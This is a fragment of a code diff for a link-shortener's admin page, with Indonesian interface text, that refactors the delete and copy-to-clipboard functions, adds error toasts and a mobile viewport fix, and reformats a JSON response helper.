+  }catch(e){
+    container.innerHTML='<div class="text-center mt-2" style="color:var(--danger);grid-column:1/-1">Gagal memuat data</div>';
   }
-  
-  async function del(s){
-    if(confirm('Hapus link ini?')){
-      await fetch('/api/delete/'+s, {method:'DELETE', headers:{'Authorization':'Bearer '+k}});
-      load();
-    }
+}
+
+async function deleteLink(sub){
+  if(!confirm('Yakin ingin menghapus link ini?'))return;
+  try{
+    await fetch('/api/delete/'+sub,{method:'DELETE',headers:{'Authorization':'Bearer '+k}});
+    showToast('Link dihapus');
+    load();
+  }catch(e){
+    showToast('Gagal menghapus');
   }
-  
-  function copy(t){
-    if(navigator.clipboard){
-      navigator.clipboard.writeText(t);
-    } else {
-      const el = document.createElement('textarea');
-      el.value = t;
-      document.body.appendChild(el);
-      el.select();
-      document.execCommand('copy');
-      document.body.removeChild(el);
-    }
+}
+
+function copyToClipboard(text){
+  if(navigator.clipboard){
+    navigator.clipboard.writeText(text);
+  }else{
+    const el=document.createElement('textarea');
+    el.value=text;
+    document.body.appendChild(el);
+    el.select();
+    document.execCommand('copy');
+    document.body.removeChild(el);
   }
+}
+
+// Mobile viewport height fix
+window.addEventListener('resize',()=>{
+  document.documentElement.style.setProperty('--vh',window.innerHeight*0.01+'px');
+});
 </script>
+
 </body></html>`;
 }
 
 function json(d, s = 200) {
   return new Response(JSON.stringify(d), {status: s, headers: {'Content-Type': 'application/json'}});
-    }
+          }
